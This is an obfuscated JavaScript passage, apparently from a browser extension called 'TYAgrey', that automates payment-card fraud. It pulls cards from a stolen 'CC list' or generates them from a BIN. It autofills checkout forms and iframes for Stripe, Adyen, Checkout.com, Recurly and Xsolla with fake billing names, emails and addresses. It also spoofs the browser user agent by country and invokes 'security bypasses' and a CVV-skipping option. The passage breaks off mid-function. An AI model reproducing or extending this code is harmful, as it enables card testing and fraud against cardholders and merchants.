        zip: "08002",
        city: "Barcelona"
      }, {
        zip: "08003",
        city: "Barcelona"
      }, {
        zip: "41001",
        city: "Sevilla"
      }, {
        zip: "41002",
        city: "Sevilla"
      }, {
        zip: "41003",
        city: "Sevilla"
      }, {
        zip: "46001",
        city: "Valencia"
      }, {
        zip: "46002",
        city: "Valencia"
      }, {
        zip: "46003",
        city: "Valencia"
      }, {
        zip: "48001",
        city: "Bilbao"
      }, {
        zip: "48002",
        city: "Bilbao"
      }, {
        zip: "48003",
        city: "Bilbao"
      }]
    }
  };
  function getRandomAddress(_0x3909d4) {
    const _0x5a0535 = countryAddressData[_0x3909d4] || countryAddressData.US;
    const _0x309630 = _0x5a0535.locations[Math.floor(Math.random() * _0x5a0535.locations.length)];
    const _0x3b9f2e = _0x5a0535.streets[Math.floor(Math.random() * _0x5a0535.streets.length)];
    const _0x1cc68f = Math.floor(Math.random() * 999) + 1;
    return {
      address: _0x1cc68f + " " + _0x3b9f2e,
      city: _0x309630.city,
      zip: _0x309630.zip
    };
  }
  function getRandomName() {
    return randomNames[Math.floor(Math.random() * randomNames.length)];
  }
  function getRandomEmail() {
    const _0x2caf83 = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com"];
    const _0x5bc562 = randomHumanNames[Math.floor(Math.random() * randomHumanNames.length)].toLowerCase();
    const _0x4f85c1 = Math.floor(Math.random() * 9999);
    const _0x264a08 = _0x2caf83[Math.floor(Math.random() * _0x2caf83.length)];
    return _0x5bc562 + _0x4f85c1 + "@" + _0x264a08;
  }
  function getRandomStreet() {
    const _0x1b2f06 = randomStreets[Math.floor(Math.random() * randomStreets.length)];
    const _0x1f2b25 = Math.floor(Math.random() * 999) + 1;
    return _0x1f2b25 + " " + _0x1b2f06;
  }
  function simulateInput(_0xa65bc4, _0x4528a6) {
    if (!_0xa65bc4) {
      return;
    }
    _0xa65bc4.focus();
    const _0x1eefa6 = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set;
    const _0x57fd54 = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value")?.set;
    if (_0xa65bc4.tagName === "INPUT" && _0x1eefa6) {
      _0x1eefa6.call(_0xa65bc4, _0x4528a6);
    } else if (_0xa65bc4.tagName === "TEXTAREA" && _0x57fd54) {
      _0x57fd54.call(_0xa65bc4, _0x4528a6);
    } else {
      _0xa65bc4.value = _0x4528a6;
    }
    _0xa65bc4.dispatchEvent(new Event("input", {
      bubbles: true
    }));
    _0xa65bc4.dispatchEvent(new Event("change", {
      bubbles: true
    }));
    _0xa65bc4.dispatchEvent(new KeyboardEvent("keyup", {
      bubbles: true
    }));
    _0xa65bc4.blur();
    const _0x53824a = _0xa65bc4.type === "email" || _0xa65bc4.name && _0xa65bc4.name.toLowerCase().includes("email") || _0xa65bc4.id && _0xa65bc4.id.toLowerCase().includes("email") || _0xa65bc4.autocomplete && _0xa65bc4.autocomplete.toLowerCase() === "email" || _0xa65bc4.placeholder && _0xa65bc4.placeholder.toLowerCase().includes("email") || _0xa65bc4.getAttribute("aria-label") && _0xa65bc4.getAttribute("aria-label").toLowerCase().includes("email");
    if (_0x53824a && _0x4528a6) {
      injectEmailBlurStyles();
    }
  }
  function simulateSelectChange(_0x1696cc, _0x189e28) {
    if (!_0x1696cc) {
      return;
    }
    _0x1696cc.focus();
    _0x1696cc.value = _0x189e28;
    _0x1696cc.dispatchEvent(new Event("input", {
      bubbles: true
    }));
    _0x1696cc.dispatchEvent(new Event("change", {
      bubbles: true
    }));
    _0x1696cc.dispatchEvent(new CustomEvent("select:change", {
      bubbles: true,
      detail: {
        value: _0x189e28
      }
    }));
    _0x1696cc.blur();
  }
  const realCardValues = {
    cardNumber: "",
    cardExpiry: "",
    cardCvc: ""
  };
  function getFakeUserAgent(_0x5e6240) {
    const _0x5b7fb2 = navigator.userAgent || "";
    const _0x13d8cf = {
      US: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      GB: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      CA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      AU: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      DE: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
      FR: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
      JP: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      SG: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      NL: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      SE: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      CH: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      IT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      ES: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      BR: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      IN: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      RU: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      CN: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      KR: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      MX: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      ZA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      AE: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      SA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      TR: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      PL: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      BE: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      AT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      NO: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      DK: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      FI: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      IE: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      PT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      GR: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      CZ: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      HU: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      IL: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      NZ: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      TH: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      MY: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      PH: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      ID: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      VN: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      RO: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      CL: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      AR: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      CO: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      PK: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      BD: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      EG: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      NG: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      KE: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      GH: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    };
    const _0x336494 = (_0x5e6240 || "").toUpperCase();
    if (_0x336494 && _0x13d8cf[_0x336494]) {
      return _0x13d8cf[_0x336494] + " TYA" + Math.floor(Math.random() * 999);
    }
    return _0x5b7fb2 + " TYA" + Math.floor(Math.random() * 999);
  }
  async function autoFillForm() {
    let _0x11a42b = customCheckoutSettings;
    if (!_0x11a42b) {
      _0x11a42b = loadCustomCheckoutSettingsFromStorage();
    }
    if (_0x11a42b) {
      const _0xd14cd0 = detectGateway();
      const _0x12ae84 = _0x11a42b;
      const _0x26a9e4 = _0x12ae84.cardReplacementEnabled !== false;
      const _0x5b6c6a = _0x12ae84.cardReplacementGateways || {
        stripe: true,
        adyen: true,
        checkout: true,
        recurly: true,
        xsolla: true
      };
      const _0x1b3c39 = _0x5b6c6a[_0xd14cd0] !== false;
      if (!_0x26a9e4 || !_0x1b3c39) {
        console.log("[TYAgrey][CustomCheckout] Card Replacement skipped:", {
          enabled: _0x26a9e4,
          gatewayEnabled: _0x1b3c39,
          gateway: _0xd14cd0
        });
        if (_0x12ae84.cvvBypass && _0x12ae84.cvvBypass[_0xd14cd0]) {}
        if (_0x12ae84.puaBypassEnabled) {
          try {
            const _0x36454e = getFakeUserAgent(_0x12ae84.puaCountry);
            Object.defineProperty(navigator, "userAgent", {
              value: _0x36454e,
              configurable: true
            });
          } catch (_0x539e4f) {}
        }
        applySecurityBypasses();
        return;
      }
    }
    let _0x54a7b0;
    let _0x5f453e;
    let _0x1699cb;
    let _0x315740;
    if (currentMode === "cc") {
      const _0x5b0bc6 = getNextCC();
      if (!_0x5b0bc6) {
        showWarning("❌ No more CCs in list", "error");
        stopAutoSubmit();
        return;
      }
      _0x54a7b0 = _0x5b0bc6.number;
      _0x5f453e = _0x5b0bc6.month;
      _0x1699cb = _0x5b0bc6.year;
      _0x315740 = _0x5b0bc6.cvv;
      const _0x305c4e = _0x54a7b0 ? _0x54a7b0.replace(/\D/g, "") : "";
      tyaCurrentCardDisplay = _0x305c4e.length >= 8 ? _0x305c4e.slice(0, 4) + " **** " + _0x305c4e.slice(-4) : _0x54a7b0 || "-";
      const _0x16c463 = document.querySelector(".cc-info");
      if (_0x16c463) {
        _0x16c463.textContent = currentCCIndex + "/" + ccList.length + " used";
      }
    } else {
      const _0xb3334a = getOverlaySavedBIN();
      if (!_0xb3334a) {
        return;
      }
      let _0xd0ebfa = null;
      let _0x5e91bf = null;
      let _0x44d703 = null;
      if (customCheckoutActive && customCheckoutSettings) {
        _0xd0ebfa = customCheckoutSettings.expMonth || null;
        _0x5e91bf = customCheckoutSettings.expYear || null;
        _0x44d703 = customCheckoutSettings.cvv || null;
      }
      const _0x399ba6 = generateCard(_0xb3334a, _0xd0ebfa, _0x5e91bf, _0x44d703);
      if (!_0x399ba6) {
        return;
      }
      _0x54a7b0 = _0x399ba6.card;
      _0x5f453e = _0x399ba6.month;
      _0x1699cb = _0x399ba6.year;
      _0x315740 = _0x399ba6.cvv;
    }
    window.generatedCard = _0x54a7b0;
    window.generatedCardFull = _0x54a7b0 + "|" + _0x5f453e + "|" + _0x1699cb + "|" + _0x315740;
    const _0x465e32 = _0x54a7b0 ? _0x54a7b0.replace(/\D/g, "") : "";
    tyaCurrentCardDisplay = _0x465e32.length >= 8 ? _0x465e32.slice(0, 4) + " **** " + _0x465e32.slice(-4) : _0x54a7b0 || "-";
    if (window.TyagreyOverlay && window.TyagreyOverlay.setCardDisplay) {
      window.TyagreyOverlay.setCardDisplay(_0x54a7b0);
    }
    realCardValues.cardNumber = _0x54a7b0;
    realCardValues.cardExpiry = _0x5f453e + "/" + _0x1699cb;
    realCardValues.cardCvc = _0x315740;
    showCardToast(_0x54a7b0, _0x5f453e, _0x1699cb, _0x315740);
    incrementHitProcessed();
    const _0x2afb9a = detectGateway();
    console.log("[TYAgrey] Detected gateway:", _0x2afb9a, "User role:", userRole);
    if (!hasGatewayAccess(_0x2afb9a)) {
      console.warn("[TYAgrey] Gateway access denied for role:", userRole, "Gateway:", _0x2afb9a);
      showWarning("⚠️ " + (_0x2afb9a.charAt(0).toUpperCase() + _0x2afb9a.slice(1)) + " gateway requires Pro or higher. Upgrade to use it.", "error");
      stopAutoSubmit();
      return;
    }
    if (_0x2afb9a === "adyen") {
      await fillAdyenForm(_0x54a7b0, _0x5f453e, _0x1699cb, _0x315740);
      await new Promise(_0xa068f1 => setTimeout(_0xa068f1, 30));
      return;
    }
    if (_0x2afb9a === "checkout") {
      await fillCheckoutForm(_0x54a7b0, _0x5f453e, _0x1699cb, _0x315740);
      await new Promise(_0x4c14fb => setTimeout(_0x4c14fb, 30));
      return;
    }
    if (_0x2afb9a === "recurly") {
      await fillRecurlyForm(_0x54a7b0, _0x5f453e, _0x1699cb, _0x315740);
      await new Promise(_0x45ec77 => setTimeout(_0x45ec77, 30));
      return;
    }
    if (_0x2afb9a === "xsolla") {
      await fillXsollaForm(_0x54a7b0, _0x5f453e, _0x1699cb, _0x315740);
      await new Promise(_0x460417 => setTimeout(_0x460417, 30));
      return;
    }
    let _0xe88266 = false;
    let _0x2173ed = false;
    if (customCheckoutActive && customCheckoutSettings) {
      const _0x2856f6 = detectGateway();
      const _0x421abc = customCheckoutSettings;
      if (_0x421abc.cvvBypass && _0x421abc.cvvBypass[_0x2856f6]) {
        _0xe88266 = true;
      }
      applySecurityBypasses();
      if (_0x421abc.puaBypassEnabled) {
        try {
          const _0x10df41 = getFakeUserAgent(_0x421abc.puaCountry);
          Object.defineProperty(navigator, "userAgent", {
            value: _0x10df41,
            configurable: true
          });
        } catch (_0x8f23c2) {}
      }
    }
    const _0x43a964 = "0000000000000000";
    const _0x5d0f14 = "01/30";
    const _0x4a2807 = "000";
    const _0x50954c = [{
      selectors: ["#cardNumber", "[name=\"cardNumber\"]", "[autocomplete=\"cc-number\"]", "[data-elements-stable-field-name=\"cardNumber\"]", "input[placeholder*=\"Card number\"]", "input[placeholder*=\"card number\"]", "input[aria-label*=\"Card number\"]", "[class*=\"CardNumberInput\"] input", "[class*=\"cardNumber\"] input", "input[name=\"number\"]", "input[id*=\"card-number\"]", "input[name*=\"card_number\"]", "input[placeholder*=\"0000\"]", "input[placeholder*=\"1234\"]"],
      value: _0x43a964,
      realValue: _0x54a7b0
    }, {
      selectors: ["#cardExpiry", "[name=\"cardExpiry\"]", "[autocomplete=\"cc-exp\"]", "[data-elements-stable-field-name=\"cardExpiry\"]", "input[placeholder*=\"MM / YY\"]", "input[placeholder*=\"MM/YY\"]", "input[placeholder*=\"MM\"]", "input[aria-label*=\"expir\"]", "[class*=\"CardExpiry\"] input", "[class*=\"expiry\"] input", "input[name=\"expiry\"]", "input[name=\"exp\"]"],
      value: _0x5d0f14,
      realValue: _0x5f453e + "/" + _0x1699cb
    }, {
      selectors: ["#cardCvc", "[name=\"cardCvc\"]", "[autocomplete=\"cc-csc\"]", "[data-elements-stable-field-name=\"cardCvc\"]", "input[placeholder*=\"CVC\"]", "input[placeholder*=\"CVV\"]", "input[aria-label*=\"CVC\"]", "input[aria-label*=\"CVV\"]", "input[aria-label*=\"security code\"]", "input[aria-label*=\"Security code\"]", "[class*=\"CardCvc\"] input", "[class*=\"cvc\"] input", "input[name=\"cvc\"]", "input[name=\"cvv\"]"],
      value: _0x4a2807,
      realValue: _0x315740
    }, {
      selectors: ["#billingName", "[name=\"billingName\"]", "[autocomplete=\"cc-name\"]", "[autocomplete=\"name\"]", "input[placeholder*=\"Name on card\"]", "input[placeholder*=\"name on card\"]", "input[aria-label*=\"Name\"]", "[class*=\"billingName\"] input", "input[name=\"name\"]"],
      value: customName || "TYAgrey"
    }, {
      selectors: ["input[type=\"email\"]", "input[name*=\"email\"]", "input[autocomplete=\"email\"]", "input[id*=\"email\"]", "input[placeholder*=\"email\"]", "input[placeholder*=\"Email\"]", "[class*=\"email\"] input", "input[aria-label*=\"email\"]"],
      value: customEmail || "tyagrey@voewo.com"
    }];
    let _0x4a7d68 = 0;
    for (const _0x3bc67f of _0x50954c) {
      if (_0xe88266 && _0x3bc67f.selectors.some(_0x545476 => /cvc|cvv/i.test(_0x545476))) {
        continue;
      }
      for (const _0x1d617d of _0x3bc67f.selectors) {
        const _0x570f88 = document.querySelector(_0x1d617d);
        if (_0x570f88) {
          simulateInput(_0x570f88, _0x3bc67f.value);
          if (_0x3bc67f.realValue) {
            _0x570f88.dataset.realValue = _0x3bc67f.realValue;
          }
          _0x4a7d68++;
          await new Promise(_0x37332d => setTimeout(_0x37332d, 8));
          break;
        }
      }
    }
    const _0x113234 = !!document.querySelector("[class*=\"StripeElement\"], [class*=\"CardElement\"], [class*=\"PaymentElement\"], iframe[name*=\"__privateStripeFrame\"], iframe[src*=\"stripe\"]");
    if (_0x113234 || isInvoiceStripePage() || _0x4a7d68 < 3) {
      await fillStripeElementsIframes(_0x54a7b0, _0x5f453e, _0x1699cb, _0x315740);
    }
    if (countryRegionEnabled) {
      const _0x4d5034 = countryRegionCode || "US";
      const _0x16c57f = ["#billingCountry", "[name=\"billingCountry\"]", "[autocomplete=\"country\"]"];
      for (const _0x2961bf of _0x16c57f) {
        const _0xed4a7a = document.querySelector(_0x2961bf);
        if (_0xed4a7a) {
          simulateSelectChange(_0xed4a7a, _0x4d5034);
          break;
        }
      }
      await new Promise(_0x3bb62d => setTimeout(_0x3bb62d, 500));
      const _0x15c4ea = getRandomAddress(_0x4d5034);
      const _0x418706 = [{
        selectors: ["#billingAddressLine1", "[name=\"billingAddressLine1\"]", "[autocomplete=\"address-line1\"]"],
        value: _0x15c4ea.address
      }, {
        selectors: ["#billingLocality", "[name=\"billingLocality\"]", "[autocomplete=\"address-level2\"]"],
        value: _0x15c4ea.city
      }, {
        selectors: ["#billingPostalCode", "[name=\"billingPostalCode\"]", "[autocomplete=\"postal-code\"]"],
        value: _0x15c4ea.zip
      }];
      for (const _0xd2ed9a of _0x418706) {
        for (const _0x5b5360 of _0xd2ed9a.selectors) {
          const _0x14b86a = document.querySelector(_0x5b5360);
          if (_0x14b86a) {
            simulateInput(_0x14b86a, _0xd2ed9a.value);
            await new Promise(_0x194f58 => setTimeout(_0x194f58, 8));
            break;
          }
        }
      }
    }
    await new Promise(_0xff183a => setTimeout(_0xff183a, 30));
  }
  async function fillStripeElementsIframes(_0x510ffc, _0x10cee1, _0x22f2c2, _0x1381a6) {
    const _0x2b34da = _0x1b630a => new Promise(_0x47179a => setTimeout(_0x47179a, _0x1b630a));
    const _0x15a38b = document.querySelectorAll("iframe[name*=\"__privateStripeFrame\"], iframe[title*=\"Secure\"], iframe[src*=\"stripe\"]");
    for (const _0x15f2c9 of _0x15a38b) {
      const _0x439a16 = _0x15f2c9.name || "";
      const _0x435aba = _0x15f2c9.title || "";
      const _0x3b19dc = _0x439a16.includes("cardNumber") || _0x435aba.toLowerCase().includes("card number");
      const _0x9f58de = _0x439a16.includes("cardExpiry") || _0x435aba.toLowerCase().includes("expir");
      const _0x5d078d = _0x439a16.includes("cardCvc") || _0x435aba.toLowerCase().includes("cvc") || _0x435aba.toLowerCase().includes("security");
      try {
        const _0x79f5b9 = _0x15f2c9.getBoundingClientRect();
        if (_0x79f5b9.width > 0 && _0x79f5b9.height > 0) {
          const _0x52810a = _0x79f5b9.left + _0x79f5b9.width / 2;
          const _0x5b2c96 = _0x79f5b9.top + _0x79f5b9.height / 2;
          const _0xa9a0ca = document.elementFromPoint(_0x52810a, _0x5b2c96);
          if (_0xa9a0ca) {
            _0xa9a0ca.click();
            await _0x2b34da(20);
          }
        }
      } catch (_0x1a178b) {}
    }
    const _0x7d7d00 = document.querySelectorAll("[class*=\"StripeElement\"], [class*=\"CardElement\"], [class*=\"PaymentElement\"]");
    for (const _0x19691a of _0x7d7d00) {
      const _0x40c0f3 = _0x19691a.getBoundingClientRect();
      if (_0x40c0f3.width > 0 && _0x40c0f3.height > 0) {
        _0x19691a.click();
        await _0x2b34da(20);
      }
    }
    await simulateStripeElementsInput(_0x510ffc, _0x10cee1, _0x22f2c2, _0x1381a6);
  }
  async function simulateStripeElementsInput(_0x54892d, _0x484123, _0xdf8bf1, _0x30e1e8) {
    const _0x495e99 = _0x1a77e2 => new Promise(_0x5c4082 => setTimeout(_0x5c4082, _0x1a77e2));
    function _0x439dcc() {
      const _0x4fa72d = document.activeElement;
      if (_0x4fa72d && _0x4fa72d.tagName === "IFRAME") {
        try {
          const _0x1d46b1 = _0x4fa72d.contentDocument || _0x4fa72d.contentWindow?.document;
          if (_0x1d46b1 && _0x1d46b1.activeElement) {
            return _0x1d46b1.activeElement;
          }
        } catch (_0x50f195) {}
        return _0x4fa72d;
      }
      return _0x4fa72d;
    }
    async function _0x2b85f9(_0x1132c1, _0x4e260e) {
      const _0x5df04e = {
        key: _0x1132c1,
        code: _0x1132c1 >= "0" && _0x1132c1 <= "9" ? "Digit" + _0x1132c1 : "Key" + _0x1132c1.toUpperCase(),
        charCode: _0x1132c1.charCodeAt(0),
        keyCode: _0x1132c1.charCodeAt(0),
        which: _0x1132c1.charCodeAt(0),
        bubbles: true,
        cancelable: true,
        view: window
      };
      _0x4e260e.dispatchEvent(new KeyboardEvent("keydown", _0x5df04e));
      _0x4e260e.dispatchEvent(new KeyboardEvent("keypress", _0x5df04e));
      _0x4e260e.dispatchEvent(new InputEvent("input", {
        data: _0x1132c1,
        inputType: "insertText",
        bubbles: true,
        cancelable: true
      }));
      _0x4e260e.dispatchEvent(new KeyboardEvent("keyup", _0x5df04e));
    }
    async function _0x184b72(_0x114f8e, _0x1f2227 = 40) {
      for (const _0x40a77d of _0x114f8e) {
        const _0x14d4d8 = _0x439dcc();
        if (_0x14d4d8) {
          await _0x2b85f9(_0x40a77d, _0x14d4d8);
          try {
            if (document.activeElement && document.activeElement.tagName === "IFRAME") {
              document.execCommand("insertText", false, _0x40a77d);
            }
          } catch (_0x5160d2) {}
        }
        await _0x495e99(_0x1f2227);
      }
    }
    async function _0x3f656a() {
      const _0x13939b = _0x439dcc();
      const _0x4b5e80 = {
        key: "Tab",
        code: "Tab",
        keyCode: 9,
        which: 9,
        bubbles: true,
        cancelable: true,
        view: window
      };
      if (_0x13939b) {
        _0x13939b.dispatchEvent(new KeyboardEvent("keydown", _0x4b5e80));
        _0x13939b.dispatchEvent(new KeyboardEvent("keyup", _0x4b5e80));
      }
      await _0x495e99(200);
    }
    async function _0x334e9a(_0xa5bcca) {
      for (const _0x24ec0d of _0xa5bcca) {
        try {
          const _0x178d99 = document.querySelectorAll(_0x24ec0d);
          for (const _0x132174 of _0x178d99) {
            const _0x5c9b84 = _0x132174.getBoundingClientRect();
            if (_0x5c9b84.width > 0 && _0x5c9b84.height > 0) {
              _0x132174.scrollIntoView({
                behavior: "instant",
                block: "center"
              });
              await _0x495e99(100);
              const _0x4b0e86 = _0x5c9b84.left + _0x5c9b84.width / 2;
              const _0x2c556a = _0x5c9b84.top + _0x5c9b84.height / 2;
              const _0x1e90fc = {
                bubbles: true,
                cancelable: true,
                view: window,
                clientX: _0x4b0e86,
                clientY: _0x2c556a,
                screenX: _0x4b0e86 + window.screenX,
                screenY: _0x2c556a + window.screenY
              };
              _0x132174.dispatchEvent(new MouseEvent("mousedown", _0x1e90fc));
              _0x132174.dispatchEvent(new MouseEvent("mouseup", _0x1e90fc));
              _0x132174.dispatchEvent(new MouseEvent("click", _0x1e90fc));
              if (_0x132174.focus) {
                _0x132174.focus();
              }
              if (_0x132174.tagName === "IFRAME") {
                try {
                  _0x132174.contentWindow?.focus();
                } catch (_0x250fa6) {}
              }
              await _0x495e99(250);
              return true;
            }
          }
        } catch (_0x23eb46) {}
      }
      return false;
    }
    const _0x13239d = ["iframe[name*=\"cardNumber\"]", "iframe[title*=\"card number\" i]", "[class*=\"CardNumberElement\"]", "[class*=\"cardNumber\"]", "[data-field=\"number\"]", "input[placeholder*=\"0000\"]", "input[placeholder*=\"1234\"]", "input[autocomplete=\"cc-number\"]", "[class*=\"CardNumber\"] input", "[class*=\"card-number\"] input"];
    let _0x5a206e = await _0x334e9a(_0x13239d);
    if (!_0x5a206e) {
      const _0x24c19f = document.querySelectorAll("[class*=\"StripeElement\"], [class*=\"CardElement\"], [class*=\"PaymentElement\"]");
      for (const _0x3d6979 of _0x24c19f) {
        const _0x37f0af = _0x3d6979.getBoundingClientRect();
        if (_0x37f0af.width > 100 && _0x37f0af.height > 20) {
          _0x3d6979.scrollIntoView({
            behavior: "instant",
            block: "center"
          });
          await _0x495e99(100);
          _0x3d6979.click();
          await _0x495e99(300);
          _0x5a206e = true;
          break;
        }
      }
    }
    if (!_0x5a206e) {
      const _0x30a055 = document.querySelector("[class*=\"payment\"], [class*=\"Payment\"], [class*=\"card\"], [class*=\"Card\"], form");
      if (_0x30a055) {
        const _0x31591c = _0x30a055.querySelector("input[type=\"text\"], input:not([type]), [contenteditable]");
        if (_0x31591c) {
          _0x31591c.scrollIntoView({
            behavior: "instant",
            block: "center"
          });
          await _0x495e99(100);
          _0x31591c.click();
          _0x31591c.focus?.();
          await _0x495e99(250);
          _0x5a206e = true;
        }
      }
    }
    if (_0x5a206e) {
      await _0x184b72(_0x54892d, 30);
      await _0x495e99(300);
      await _0x3f656a();
      await _0x184b72(_0x484123 + _0xdf8bf1, 30);
      await _0x495e99(300);
      await _0x3f656a();
      await _0x184b72(_0x30e1e8, 30);
      await _0x495e99(300);
    }
  }
  async function fillAdyenForm(_0x348daf, _0x5db4c1, _0x442f7d, _0x3e47a4) {
    const _0x4d9348 = _0x51e3dd => new Promise(_0x2f6ab4 => setTimeout(_0x2f6ab4, _0x51e3dd));
